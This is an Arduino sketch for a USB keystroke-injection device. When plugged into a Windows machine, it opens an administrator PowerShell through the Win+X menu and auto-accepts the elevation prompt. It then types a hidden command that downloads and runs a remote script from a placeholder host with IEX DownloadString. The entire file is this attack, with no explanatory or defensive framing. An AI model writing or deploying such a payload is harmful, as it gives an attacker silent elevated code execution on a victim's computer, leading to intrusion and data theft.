#include <Keyboard.h>

void setup() {
  // put your setup code here, to run once:
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('x');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.releaseAll();
  Keyboard.print("powershell.exe -nop -w hidden -c \"IEX (New-Object Net.Webclient).DownloadString('http://payload_location')\"");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}
void loop() {
  // put your main code here, to run repeatedly:
}

